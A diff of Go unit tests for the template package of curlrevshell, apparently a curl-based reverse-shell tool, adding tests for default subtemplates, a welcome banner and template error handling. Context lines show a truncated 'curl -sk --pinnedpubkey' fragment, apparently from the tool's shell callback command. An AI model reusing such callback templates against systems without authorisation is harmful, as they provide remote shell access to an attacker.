@@ -5,7 +5,7 @@ package crstemplate
  * Tests for crstemplate.go
  * By J. Stuart McMurray
  * Created 20241212
- * Last Modified 20260829
+ * Last Modified 20261022
  */
 
 import (
@@ -18,7 +18,11 @@ import (
 	"os"
 	"path/filepath"
 	"reflect"
+	"strings"
+	"syscall"
 	"testing"
+
+	"github.com/magisterquis/curlrevshell/lib/tlog"
 )
 
 // Make sure we have ALL the subtemplates and the root template is emptyish.
@@ -75,8 +79,6 @@ curl -sk --pinnedpubkey sha256//testFPtestFPtestFPtestFPtestFPtestFPtestFPx= htt
 			)
 		}
 	)
-
-	var ()
 
 	/* Make sure we don't miss anything if we've added a field later. */
 	if got := firstEmptyField(params, ""); "" != got {
@@ -135,19 +137,22 @@ curl -sk --pinnedpubkey sha256//testFPtestFPtestFPtestFPtestFPtestFPtestFPx= htt
 			werr: ErrOutsideSubtemplate,
 		},
 		SubtemplateCallback + "/no_file": {
-			name: SubtemplateCallback,
-			have: haveNoFile,
-			werr: fs.ErrNotExist,
+			name:  SubtemplateCallback,
+			have:  haveNoFile,
+			wantf: defaultCallback,
+			werr:  fs.ErrNotExist,
 		},
 		SubtemplateFiles + "/no_file": {
-			name: SubtemplateFiles,
-			have: haveNoFile,
-			werr: fs.ErrNotExist,
+			name:  SubtemplateFiles,
+			have:  haveNoFile,
+			wantf: defaultFiles,
+			werr:  fs.ErrNotExist,
 		},
 		SubtemplateScript + "/no_file": {
-			name: SubtemplateScript,
-			have: haveNoFile,
-			werr: fs.ErrNotExist,
+			name:  SubtemplateScript,
+			have:  haveNoFile,
+			wantf: defaultScript,
+			werr:  fs.ErrNotExist,
 		},
 		SubtemplateCallback + "/overridden": {
 			name: SubtemplateCallback,
@@ -347,6 +352,49 @@ func TestExecute_DummyRequest(t *testing.T) {
 	}
 }
 
+// Can we execute the welcome template?
+func TestExecute_DefaultWelcome(t *testing.T) {
+	var (
+		tVer  = tlog.S("version")
+		tAddr = tlog.S("address")
+	)
+	for n, c := range map[string]struct {
+		have WelcomeParams
+		want string
+	}{"normal_welcome": {
+		have: WelcomeParams{Version: tVer, ListenAddress: tAddr},
+		want: fmt.Sprintf(
+			strings.Join([]string{
+				`Welcome to curlrevshell version %s`,
+				`Listening on %s`,
+			}, "\n"),
+			tVer,
+			tAddr,
+		),
+	}, "no_listen_address": {
+		have: WelcomeParams{Version: tVer},
+		want: `Welcome to curlrevshell version ` + tVer,
+	}} {
+		t.Run(n, func(t *testing.T) {
+			got, err := Execute(SubtemplateWelcome, "", c.have)
+			if nil != err {
+				t.Fatalf("Error: %v", err)
+			}
+			if got != c.want {
+				t.Errorf(
+					"Incorrect output\n"+
+						"have:\n%#v\n"+
+						"got:\n%s\n"+
+						"want:\n%s",
+					c.have,
+					got,
+					c.want,
+				)
+			}
+		})
+	}
+}
+
 // firstEmptyField returns the first empty field or nil pointer in x, recursing
 // into substructs.  The field name will be prefixed with prefix, which should
 // normally not be set by callers.
@@ -467,4 +515,73 @@ func TestIsNilPointer(t *testing.T) {
 			}
 		})
 	}
+}
+
+// Do we whine when we error working out if there's non-subtemplate data?
+func TestExecute_ErrorCheckingForExtraneousData(t *testing.T) {
+	/* Write a template known to cause problems. */
+	fn := filepath.Join(t.TempDir(), "t.tmpl")
+	if err := os.WriteFile(fn, []byte(
+		`{{.Nope}}{{ define "script" }}{{.Nope}}{{ end }}`,
+	), 0600); nil != err {
+		t.Fatalf("Error writing template to file: %v", err)
+	}
+	b, err := Execute(SubtemplateCallback, fn, Params{})
+	if 0 != len(b) {
+		t.Errorf("Unexpect template output: %q", b)
+	}
+	dce, ok := errors.AsType[ExtraneousTemplateDataCheckError](
+		err,
+	)
+	if !ok {
+		t.Errorf("Incorrect error type\n got: %T\nwant: %T", err, dce)
+	}
+	if got, want := dce.Error(),
+		`checking for extraneous template data: `+
+			`template: _base:1:2: `+
+			`executing "_base" at <.Nope>: `+
+			`can't evaluate field Nope in `+
+			`type crstemplate.Params`; got != want {
+		t.Errorf("Incorrect error\n got: %v\nwant: %v", got, want)
+	}
+}
+
+// Do we whine when we can't merge templates?
+func TestMergeTemplateFrom_Errors(t *testing.T) {
+	/* Do we whine when handedd a directory instead of a template? */
+	t.Run("directory", func(t *testing.T) {
+		tmpl, err := mergeTemplateFrom(t.TempDir())
+		if nil != tmpl {
+			t.Errorf("Got non-nil template")
+		}
+		if got, want := err, syscall.EISDIR; !errors.Is(got, want) {
+			t.Errorf(
+				"Incorrect error\n got: %v\nwant: %v",
+				got,
+				want,
+			)
+		}
+	})
+	/* Do we whine when handedd a directory instead of a template? */
+	t.Run("invalid_template", func(t *testing.T) {
+		fn := filepath.Join(t.TempDir(), "t.tmpl")
+		if err := os.WriteFile(fn, []byte("{{"), 0600); nil != err {
+			t.Fatalf(
+				"Error writing broken template to file: %v",
+				err,
+			)
+		}
+		tmpl, err := mergeTemplateFrom(fn)
+		if nil != tmpl {
+			t.Errorf("Got non-nil template")
+		}
+		if got, want := err.Error(), "parsing template: "+
+			"template: _base:1: unclosed action"; got != want {
+			t.Errorf(
+				"Incorrect error\n got: %v\nwant: %v",
+				got,
+				want,
+			)
+		}
+	})
 }
